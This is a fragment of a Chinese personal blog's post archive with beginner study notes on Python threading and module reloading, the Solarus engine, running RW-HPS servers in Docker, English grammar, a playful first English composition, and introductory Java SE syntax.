<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">_thread.start_new_thread ( function, args[, kwargs] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>参数说明:</p>
<ul>
<li><p>function : 线程函数。</p>
</li>
<li><p>args : 传递给线程函数的参数,他必须是个tuple类型。</p>
</li>
<li><p>kwargs - 可选参数。</p>
</li>
<li><p>线程模块</p>
</li>
<li><p>Python3 通过两个标准库 _thread 和 threading 提供对线程的支持。</p>
</li>
<li><p>_thread 提供了低级别的、原始的线程以及一个简单的锁，它相比于 threading 模块的功能还是比较有限的。</p>
</li>
<li><p>threading 模块除了包含 _thread 模块中的所有方法外，还提供的其他方法：</p>
</li>
</ul>
<p>threading.currentThread(): 返回当前的线程变量。 </p>
<p>threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。 </p>
<p>threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。</p>
<p>除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法:</p>
<p>run(): 用以表示线程活动的方法。</p>
<p>start():启动线程活动。</p>
<p>join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。</p>
<p>isAlive(): 返回线程是否活动的。</p>
<p>getName(): 返回线程名。</p>
<p>setName(): 设置线程名。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Python模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Solarus</title>
    <url>/2022/11/13/2022-11-13-Solarus/</url>
    <content><![CDATA[<p><img src="https://solarus-games.org/data/en/entities/book-chapter/tutorial/solarus-official-guide/01-basics/01-introduction/engine-logo.png" alt="Solarus"></p>
<p>官方的介绍是这样的</p>
<blockquote><p>Solarus is a free and open-source game engine, licensed under GPL v3. It is written from scratch in C++ and uses SDL2. Consequently, it is compatible with a large set of platforms. You can explore the source code if you’re curious.</p>
<footer><strong>@Solarus</strong><cite><a href="https://solarus-games.org/en/development/tutorials/solarus-official-guide/basics/introduction">solarus-games.org/en/development/tutorials/solarus-official-guide/basics/introduction</a></cite></footer></blockquote>

<p>根据我的理解则是：
  Solarus是一个开源的，受保护的，功能强大的自由软件-2DRPG动作游戏引擎。
  他的底层由C++编写，这为游戏的运行效率打下了很好的基础。而在开发游戏的过程一般只需要用到LUA就可以做绝大多数事情，而引擎的内容对普通开发者来说不用去动。</p>
]]></content>
      <categories>
        <category>engine</category>
      </categories>
      <tags>
        <tag>Solarus</tag>
        <tag>engine</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Docker多开RW-HPS</title>
    <url>/2022/11/17/2022-11-17-%E4%BD%BF%E7%94%A8docker%E5%A4%9A%E5%BC%80RW-HPS/</url>
    <content><![CDATA[<p>准备工作：</p>
<p>一台Linux服务器
安装docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">docker pull [最新版的docker镜像]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.由于Dr没有在1.0.0.x版本的docker镜像中准备res资源，我们需要进入docker后手动准备</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">wget -c 下载链接</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.删除多余的sh脚本和jar，换成最新版的core和jar,并安装vim
ps: pull来的docker内部预置好了对RW-HPS兼容性最好的JAVA 11 JKD</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">rm -rf 你要删的文件</span><br><span class="line"></span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line">apt install sudo</span><br><span class="line"></span><br><span class="line">apt install vim</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3.准备完成，退出镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ctrl + p + q</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4.查看容器ID，进行构建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">docker commit -a [作者信息] [容器id] [镜像名]:[TAG]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>5.打包完成，指定端口启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">docker run --name 容器名称 -d -p 端口:端口 -v ~/rw-hps-data:/app/data [你的镜像ID]:[TAG]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>6.进入容器，修改配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">docker exec -it [容器名称] bash</span><br><span class="line"></span><br><span class="line">cd data</span><br><span class="line"></span><br><span class="line">sudo vim Config.json</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>7.卸载多余组件，启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo dpkg --purge vim vim-common vim-addon-manager</span><br><span class="line"></span><br><span class="line">java -jar [你的jar包]	</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ps:实际命令中所有[]都是不需要写的，仅在文中起到提示作用。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Linux</tag>
        <tag>debian</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 模块重载</title>
    <url>/2022/11/03/2022-11-3-Python%20reload()%20%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<ul>
<li>Python 模块重载 更好的调用函数的方法</li>
<li>前言
  反复的去定义一个重复的代码会极大的降低我们的代码质量和工作效率，而Python本身模块目录结构的调用方式是有限的，在此之前先解释一下什么是Python包。</li>
</ul>
<blockquote><p>Python中的包
包是一个分层次的文件目录结构，它定义了一个由模块及子包，和子包下的子包等组成的 Python 的应用环境。</p>
<footer><strong>@菜鸟教程</strong><cite><a href="https://www.runoob.com/python3/python3-basic-syntax.html">www.runoob.com/python3/python3-basic-syntax.html</a></cite></footer></blockquote>

<p>而包自身的调用方式是由主到次的，也就是主模块可以调用(from import)所有子模块，而子模块只能调用自己下层的子模块，而当我们需要子模块去调用上层封装的函数或者类的时候，这就体现的极为不方便。
好在，Python为我们提供的一个函数 – reload() 函数</p>
<ul>
<li><p>使用第一步
  <code>from importlib import reload</code>
  将这个模块导入
  切记不要导成<code>from imp import reload</code>这样的形式
  <code>imp</code>中的<code>reload</code>是一个古老的且已经弃用的函数</p>
</li>
<li><p>函数说明
  reload的中文翻译为：重读  而它的用法也正如其名
  reload()的主要用途便是在子模块中加载先前已经加载过的模块。
  也因此，必须模块已经加载过才可以使用reload()进行重载。
  如果你使用reload()去重载一个子模块中的模块，或者说未载入过的模块，那很显然是不行的。加载子模块的函数请使用常规的导入方法。
  重载的形式就像是复制了代码段，将代码重新的在函数内执行一遍。</p>
</li>
<li><p>函数用法
  非常的简单，直接填写模块名
  例:
  reload(funciton)
<br>
  reload(xxx)
  ps:中间的模块名并非是字符串的形式，请勿加引号或者双引号</p>
</li>
</ul>
<p>​	</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>英语的介词</title>
    <url>/2022/11/06/2022-11-6-%E8%8B%B1%E8%AF%AD%E4%BB%8B%E8%AF%8D%E8%AE%AD%E7%BB%83/</url>
    <content><![CDATA[<p>in，on，with，by，for，at，about，under，of</p>
<p>【介词】
介词是一种虚词，不能单独作为句子成分，通常用在名词或代词之前。
常用的英语介词有：in，on，with，by，for，at，about，under，of等。</p>
<p>表示在某时间时，常用at，on，in等介词。at用来表示在某一段时刻，如at six：在6点钟。
on用来表示在星期几或是某日，如：on Monday：在星期一。
in用来表示一天中的早中晚、月份、季节或年份。如：in Spring在春天。</p>
<p>during，for，over，within，throughout，from和to等介词表示期间。
before，after，since，until，till，between，up to等，也有时间概念。</p>
<p>在表示方位时，常用at，in，on，to，for，above，over，below，under，
in front of，in the front of，beside，behind等。</p>
<p>英语介词还可以表示进行，在作为表语时，at、on、under等可以表示正在进行的动作。
如：she is at work.她正在工作。</p>
<p>介词也可以表示原因，常用for等。在表示方法、手段的介词常用by，with，through等。
表示数量的时候常用介词有about，around，over等。</p>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>英语单词的构成</title>
    <url>/2022/11/06/2022-11-6-%E8%8B%B1%E8%AF%AD%E7%9A%84%E5%8D%95%E8%AF%8D%E6%9E%84%E6%88%90/</url>
    <content><![CDATA[<p>【构词法】 
—转化法
动词转化为名词
名词转化为动词
形容词转化为动词
形容词转化为名词
形容词转化为副词
个别词分场合转化为名词
—合成法
合成名词
合成形容词
合成动词
合成副词
合成代词
合成介词
—派生法
前缀-单词的意义
形容词的后缀
名词的后缀
动词的后缀
副词的后缀
数词的后缀
—其他
拼缀法
缩略法
逆向构词法
拟声法
类比法
截短构词法
词根词缀构词法</p>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>英语的语型</title>
    <url>/2022/11/06/2022-11-6-%E8%8B%B1%E8%AF%AD%E7%9A%84%E5%8F%A5%E5%9E%8B/</url>
    <content><![CDATA[<p>一、句型1： Subject (主语) ＋ Verb (谓语)</p>
<p>二、句型2：Subject (主语) ＋ Link. V(系动词) ＋ Predicate(表语)</p>
<p>三、句型3：Subject(主语) ＋ Verb (谓语) ＋ Object (宾语)</p>
<p>四、句型4： Subject(主语)＋Verb(谓语)＋ Indirect object(间接宾语)＋Direct object (直接宾语)</p>
<p>五、句型5： Subject(主语)＋Verb (动词)＋Object (宾语)＋Complement(补语)</p>
<p>【主语】</p>
<p>主语是谓语的陈述对象，如“我写字”中的“我”就是主语，它做出“写”这个动作，“写”则是谓语，用来陈述主语的动作，
而“字”是接受谓语“写”这个动作的对象，它因此被称为宾语，有的语法书也称它为“客体”或“受体”。
主语是句子中的陈述对象，与英语语法也有相似之处。常常由名词、 代词、或 名词性短语充当。
形容词、动词、 谓语性短语和 主谓短语也可充当主语。 句子成分划分时，主语符号为双横线。</p>
<p>【谓语】</p>
<p>谓语(Predicate)是对主语动作状态或特征的陈述或说明，指出”做什么(what to do)” , “是什么(what is this)”。
谓语动词的位置一般在主语之后，经常用动词和形容词搭配来充当谓语动词。
在英语中，动词按作用和功能主要分为两大类，一类是谓语动词，另一类是非谓语动词。</p>
<p>【宾语】</p>
<p>宾语，也称受词，是指一个动作（动词）的接受者。
宾语分为直接宾语和间接宾语两大类，其中直接宾语指动作的直接对象，间接宾语说明动作的非直接，但受动作影响的对象。
一般而言，及物动词后面最少要有一个宾语，而该宾语通常为直接宾语，
有些及物动词要求两个宾语，则这两个宾语通常一个为直接宾语，另一个为间接宾语。</p>
<p>【句型一】
这种句型中的动词大多是不及物动词，所谓不及物动词，就是这种动词后不可以直接接宾语。
常见的动词如：work, sing, swim, fish, jump, arrive, come, die, disappear, cry, happen等。</p>
<p>如：</p>
<ol>
<li><p>Li Ming works very hard.李明学习很努力。</p>
</li>
<li><p>The accident happened yesterday afternoon.事故是昨天下午发生的。</p>
</li>
</ol>
<p>3）Spring is coming.</p>
<ol start="4">
<li>We have lived in the city for ten years.</li>
</ol>
<p>【句型二】
这种句型主要用来表示主语的特点、身份等。其系动词一般可分为下列两类：</p>
<p>(1)表示状态。这样的词有：be, look, seem, smell, taste, sound, keep等。如：</p>
<ol>
<li><p>This kind of food tastes delicious.这种食物吃起来很可口。</p>
</li>
<li><p>He looked worried just now.刚才他看上去有些焦急。</p>
</li>
</ol>
<p>(2)表示变化。这类系动词有：become, turn, get, grow, go等。如：</p>
<ol>
<li><p>Spring comes. It is getting warmer and warmer.春天到了，天气变得越来越暖和。</p>
</li>
<li><p>The tree has grown much taller than before.这棵树比以前长得高多了。</p>
</li>
</ol>
<p>【句型三】
这种句型中的动词一般为及物动词, 所谓及物动词，就是这种动词后可以直接接宾语，
其宾语通常由名词、代词、动词不定式、动名词或从句等来充当。</p>
<p>例：</p>
<ol>
<li><p>He took his bag and left.（名词） 他拿着书包离开了。</p>
</li>
<li><p>Li Lei always helps me when I have difficulties. (代词)当我遇到困难时，李雷总能给我帮助。</p>
</li>
<li><p>She plans to travel in the coming May Day.（不定式）她打算在即将到来的“五一”外出旅游。</p>
</li>
<li><p>I don?t know what I should do next. (从句)我不知道下一步该干什么。</p>
</li>
</ol>
<p>注意：英语中的许多动词既是及物动词，又是不及物动词。</p>
<p>【句型四】</p>
<p>这种句型中，直接宾语为主要宾语，表示动作是对谁做的或为谁做的，在句中不可或缺，常常由表示“物”的名词来充当；
间接宾语也被称之为第二宾语，去掉之后，对整个句子的影响不大，多由指“人”的名词或代词承担。
引导这类双宾语的&#96;常见动词有：buy, pass, lend, give, tell, teach, show, bring, send等。</p>
<p>如：</p>
<ol>
<li>Her father bought her a dictionary as a birthday present.她爸爸给她买了一本词典作为生日礼物。</li>
</ol>
<p>2）The old man always tells the children stories about the heroes in the Long March.</p>
<p>老人经常给孩子们讲述长征途中那些英雄的故事。 上述句子还可以表达为：</p>
<p>1）Her father bought a dictionary for her as a birthday present.</p>
<p>2）The old man always tells stories about the heroes to the children in the Long March.</p>
<p>【句型五】
这种句型中的“宾语 ＋ 补语”统称为“复合宾语”。宾语补足语的主要作用或者是补充、说明宾语的特点、身份等；
或者表示让宾语去完成的动作等。担任补语的常常是名词、形容词、副词、介词短语、分词、动词不定式等。</p>
<p>如：</p>
<p>1）You should keep the room clean and tidy. 你应该让屋子保持干净整洁。（形容词）</p>
<ol start="2">
<li><p>We made him our monitor.(名词)我们选他当班长。</p>
</li>
<li><p>His father told him not to play in the street.(不定式)他父亲告诉他不要在街上玩。</p>
</li>
</ol>
<p>4）My father likes to watch the boys playing basketball.(现在分词)</p>
<ol start="5">
<li>Yesterday I had a picture taken with two Americans.(过去分词)</li>
</ol>
<p>● 常见的动词有: tell, ask, advise, help, want, would like, order, force, allow等。</p>
<p>● 注意：动词have, make, let, see, hear, notice, feel, watch等后面所接的动词不定式作宾补时，不带to。如：</p>
<ol>
<li><p>The boss made him do the work all day.老板让他整天做那项工作。</p>
</li>
<li><p>I heard her sing in the next room all the time last night.昨天晚上我听见她在隔壁唱了一个晚上。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>英语小作文</title>
    <url>/2022/11/07/2022-11-7-%E5%B0%8F%E4%BD%9C%E6%96%87/</url>
    <content><![CDATA[<p>由于本人之前英语极差，所以此次小作文是本人第一次尝试英语写作。</p>
<p>This is book title will say light or dark.</p>
<p>All this because by my fast subdorsal 3000 English word.</p>
<p>One</p>
<p>“Blake … Blake..” A very weaking voice said.
Silent S city,clear night sky under a white hair young girl lying in the blood pool.
Her double eyes slightly tremble, like having seen tremendous terror.
“If can again attack,I certain win….”
Scene transformation in eyes front of us ,last is new
Sky.
That is bloody red sky. 
“girl, I am god.”
“Do you yearn force?”
“yes”
“Then I will achieve your went.”
boom!!!
···emmmmm
lan得写了</p>
<p>aaaaaaaaaaa~</p>
<p>QAQ</p>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>写作</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVASE _1</title>
    <url>/2022/07/20/2022-7-20-%E8%BF%99%E6%98%AF%E7%88%B7%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>C语言
贴近硬件，运行快，效率高
操作系统，编译器，数据库，网络系统  【非常严格】
指针和内存管理</p>
<p>1982 C++	【非常复杂的特性】【需要非常多的底层知识】
面向对象
兼容C
图形领域，游戏</p>
<p>JAVA
语法像C
没有指针
没有内存管理
真正的可移植性，到处运行（）
面向对象
类型安全
高质量类库
层叫 	C++ –</p>
<p>JAVA初生</p>
<p>图形界面程序 Applet</p>
<p>Java 2 桌面 J2SE</p>
<p>Java 2移动版 J2ME 占领手机</p>
<p>Java 2服务器 J2EE</p>
<hr>
<p>构建工具：Ant,Mavern,Jekins</p>
<p>应用服务器：Tomcat,Jetty,Jboss,Websphere,weblogic</p>
<p>Web开发：Struts,Spring,Hibernate,myBatis</p>
<p>开发工具：Eclipse,Netbean,intellij ideam,JbUILDER</p>
<p>2006： Hadoop</p>
<p>2008:	Android</p>
<hr>
<p>JAVA特性和优势</p>
<p>简单性</p>
<p>面向对象</p>
<p>可移植性</p>
<p>高性能</p>
<p>分布式</p>
<p>动态性	反射机制</p>
<p>多线程</p>
<p>安全性</p>
<p>健壮性	通过捕获异常来解决异常</p>
<p>【心态】：去学习的过程中爱上它，这样才能主动学习</p>
<p>JAVA的成功：实力 + 运气 找到了互联网发展的节奏</p>
<hr>
<p>JAVA三大版本</p>
<p>Write Once \Run Anywhere （虚拟机）</p>
<p>JavaSE：标准版 （桌面程序，控制台开发）</p>
<p>JavaME: 嵌入式开发 （手机，小家电） 【冷门】</p>
<p>JavaEE: E企业级开发 （web端，服务器开发）</p>
<hr>
<p>JDK包含 JRE 全称：Java Development Kit [工具]</p>
<p>JRE 全称 ： Java Runtime Environment [运行]</p>
<p>JVM: 全称 JAVA Virtual Machine [虚拟机]</p>
<p>通过虚拟机屏蔽了底层数据的差别</p>
<p>JAVA SE API 【接口】</p>
<hr>
<p>JAVA开发环境搭建</p>
<ul>
<li>JDK下载与安装</li>
<li>JDK 卸载 ：</li>
</ul>
<p>​	1.删除JAVA安装目录</p>
<p>​	2.删除变量 （电脑属性，环境变量，path）</p>
<p>​	3.java -version</p>
<ul>
<li><p>安装JAVA</p>
<ol>
<li><p>搞到安装包</p>
</li>
<li><p>设置JAVA_HOME</p>
</li>
<li><p>设置path变量</p>
</li>
<li><p>(%表示引用)</p>
</li>
</ol>
</li>
<li><p>测试 java -version</p>
</li>
<li><p>src.zip 中有java源码</p>
</li>
<li><p>lib为库</p>
</li>
<li><p>include为C的头文件目录</p>
</li>
</ul>
<hr>
<p>我的JAVA对世界的第一声呐喊</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> java <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;  <span class="comment">//类名</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span>&#123;  <span class="comment">//方法</span></span><br><span class="line">		System.out.print(<span class="string">&quot;Hello,World!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码如上</p>
<hr>
<p>承接上文	在搞完了之后爷就遇到了+编码问题</p>
<p>所幸在之前的RWmod开发中早已经遇到过类似的，便直接上网求证，很快解决了。</p>
<p>原因为txt的UFT-8中是带ROM的，而 javac是无法识别带ROM 的UFT-8</p>
<p>只好安装了一个Notepad++，将编码修改后，便可以正常运行了。</p>
<p>唔，以后池沼开发一个自己的编译器，这个用着真不舒服。。</p>
<hr>
<p>解决问题的网址</p>
<p>https:&#x2F;&#x2F;blog.csdn.net&#x2F;White_Idiot&#x2F;article&#x2F;details&#x2F;54670243</p>
<p>同时学到了一条新命令</p>
<p>javac -encoding “UTF-8” FirstSample.java</p>
<p>通过指定编码的方式运行javac</p>
<hr>
<p>注意事项</p>
<ul>
<li>大小写问题</li>
<li>中英文问题</li>
</ul>
<hr>
<p>使用IDEA开发环境</p>
<p>新建方法 -新建类 - 快捷键 (待补充)</p>
<hr>
<p>JAVA基本语法</p>
<ol>
<li>注释、标识符</li>
<li>数据类型</li>
<li>类型转换</li>
<li>变量、常量</li>
<li>运算符</li>
<li>包机制、JavaDoc</li>
</ol>
<hr>
<p>IDEA的项目设置五大类</p>
<ul>
<li><p>Project 项目</p>
<p>|name   |   SDK   |  Language level |  Compiler output ps:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">名称	  |   工具   |   语言等级 		  |   输出文件夹       </span><br></pre></td></tr></table></figure></li>
</ul>
<p>​    输出文件夹 ps: Used  for modules subdirectories, Production and Test directories for the corresponding sources.</p>
<p>​	翻译：用于相应源的模块子目录、生产目录和测试目录。</p>
<ul>
<li><p>Modules 模块</p>
<p>Name: 模块的名称														Add Content Root（添加新的内容根）</p>
<p>Sources   |  Paths   |   Dependencies</p>
<p>源			  |   路径     |  依赖关系</p>
</li>
</ul>
<p>Sources ： Language level </p>
<p>文件夹标记</p>
<p>Mark as:   Sources \blue\    Tests \green\  Resources\资源\   Test Resources\测试资源\  Excluded\排除\</p>
<p>Paths : Compiler Output （编译器输出）：Inherit project compile output path(和项目输出路径相同)</p>
<p>​																		：Use module compile output path （使用模块编译输出路径）</p>
<p>JavaDoc：Manage external JavaDocs attached to this module, External JavaDoc override Javadoc override Java DOc annotations you might have in your module.（管理附加到此模块的外部JavaDoc，外部JavaDoc覆盖模块中可能有的JavaDoc注释。）</p>
<ul>
<li>Libraries 图书馆</li>
</ul>
<p>​	   Nothing to show（没啥可展示的）	</p>
<p>​	   右侧  Select a library to view or edit its details here (在此处选择要查看或编辑其详细信息的库)</p>
<ul>
<li><p>Facets  面</p>
<p>No facets are configured(没有配置的面)</p>
<p>Detection (检查)</p>
<p>右侧 ：Enable framework detection（启用检测框架）</p>
<p>​			 Exclude from detection(排除在检测外) </p>
</li>
<li><p>Artifacts</p>
</li>
</ul>
<p>  即编译后的Java类，Web资源等的整合，用以测试、部署等工作。再白话一点，就是说某个module要如何打包，例如war exploded、war、jar、ear等等这种打包形式。某个module有了 Artifacts 就可以部署到应用服务器中了。</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>&#x2F;&#x2F; 单行注释</p>
<p>&#x2F;*   *&#x2F; 多行注释</p>
<hr>
<h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p>| abstract | assert  | bollean | break   | byte  |
| :——: | ——- | ——- | ——- | —– |
| case     | catch   | char    | calss   | conse |
| continue | default | do      | double  | else  |
| enum     | extends | final   | finally | float |
|  for                | goto     |if|implements|import|
| instanceof  |int|interface|long|native|
| new             |package|private|protected|public|
| return|strictfp|short|static|super|
| switch|synchronized|this|throw|throws|
| transient|try|void|volatile|while|</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calss1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">qwq</span> <span class="operator">=</span><span class="string">&quot;233&quot;</span>; <span class="comment">//qwq为标识符，以小写字母开头</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">QAQ</span> <span class="operator">=</span> <span class="string">&quot;233&quot;</span>;<span class="comment">//大写字母</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">$qwq</span> <span class="operator">=</span> <span class="string">&quot;233&quot;</span>;<span class="comment">//美元符号</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">_QWQ</span> <span class="operator">=</span> <span class="string">&quot;233&quot;</span>;<span class="comment">//下划线</span></span><br><span class="line">        String 傻逼 = <span class="string">&quot;233&quot;</span>;<span class="comment">//中文命名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//标识符是大小写敏感得</span></span><br></pre></td></tr></table></figure>

<h2 id="JAVA-数据类型"><a href="#JAVA-数据类型" class="headerlink" title="JAVA 数据类型"></a>JAVA 数据类型</h2><h3 id="JAVA为强类型语言"><a href="#JAVA为强类型语言" class="headerlink" title="JAVA为强类型语言"></a>JAVA为强类型语言</h3><ul>
<li><p>要求变量的使用严格符合规定，所有变量必须先定义后使用</p>
<p>弱类型就反之了（例：VB，JS ）</p>
</li>
</ul>
<h4 id="JAVA的数据类型分为两大类"><a href="#JAVA的数据类型分为两大类" class="headerlink" title="JAVA的数据类型分为两大类"></a>JAVA的数据类型分为两大类</h4><ul>
<li><p>基本类型 primitive type</p>
<ol>
<li>整数类型: byte1个字节范围 short 2个字节范围 int 四个字节范围 long 8个字节范围</li>
<li>浮点类型 ： float 占四个字符范围 double 占8个字符范围</li>
<li>字符类型： char 占两个字节</li>
<li>boolean类型：占1位，只有true 和 false</li>
</ol>
</li>
<li><p>引用类型 reference type ：类、接口、数组</p>
</li>
</ul>
<hr>
<p>变量需要初始化 &#x3D; 变量需要定义</p>
<p>int 和 String 都是类型</p>
<p>int 整数  String 字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.SQLOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calss2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 整数扩展： 进制 二进制 八进制 十六进制</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>; <span class="comment">//</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">010</span>; <span class="comment">// 八进制</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0x10</span>; <span class="comment">//十六进制 0x开头</span></span><br><span class="line"></span><br><span class="line">        System.out.println(i);</span><br><span class="line">        System.out.println(i2);</span><br><span class="line">        System.out.println(i3);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="comment">//-------------------------------------------</span></span><br><span class="line">        <span class="comment">//浮点数扩展： 有限 离散 舍入误差 大约 接近但不等于</span></span><br><span class="line">        <span class="comment">//最好减少使用浮点数进行表示和比较 ，由于浮点数字长有限所以有误差得</span></span><br><span class="line">        <span class="comment">//float（浮点数）</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">f</span> <span class="operator">=</span><span class="number">0.1f</span>; <span class="comment">//0.1</span></span><br><span class="line">        <span class="type">double</span> d= <span class="number">1.0</span>/<span class="number">10</span>; <span class="comment">//0.1</span></span><br><span class="line">        System.out.println(f==d);</span><br><span class="line">        <span class="comment">//字符扩展</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span><span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span><span class="string">&#x27;中&#x27;</span>;</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println((<span class="type">int</span>)c1);<span class="comment">//强制换行</span></span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println((<span class="type">int</span>)c2);<span class="comment">//强制换行</span></span><br><span class="line">        <span class="comment">//所有字符本质还是数字</span></span><br><span class="line">        <span class="comment">//编码 Unicode 表：97 = a 2字节 65 =A</span></span><br><span class="line">        <span class="comment">// U0000 UFFFF 为Unicode编码格式</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span><span class="string">&#x27;\u0061&#x27;</span>;  <span class="comment">//一个Unicode字符进行转换</span></span><br><span class="line">        System.out.println(c3);</span><br><span class="line">        <span class="comment">//转义字符 \t 制表符</span></span><br><span class="line">        <span class="comment">// \n 换行</span></span><br><span class="line">        <span class="comment">// 更多转义字符待查</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        System.out.println(sa==sb);<span class="comment">//判断相等 “==” //判断为不相等</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sd</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        System.out.println(sc==sd); <span class="comment">//识别为相等</span></span><br><span class="line">        <span class="comment">//对象</span></span><br><span class="line">        <span class="comment">//布尔值扩展</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (flag==<span class="literal">true</span>) &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)&#123;&#125;   <span class="comment">//默认是等于true</span></span><br><span class="line">        &#125; <span class="comment">//Less is more! 代码精简易读</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="字节"><a href="#字节" class="headerlink" title="字节"></a>字节</h4><p>位（bit）</p>
<p>字节（byte）</p>
<p>1B &#x3D; 8BIT</p>
<p>字母：指的是计算机中的字母、数字、字和符号。</p>
<p>电脑32位和64位的区别，寻指的能力，可以装的内存不同，</p>
<hr>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><ul>
<li><p>由于JAVA是强类型语言。所以进行有些运算的时候，需要用到类型转换。</p>
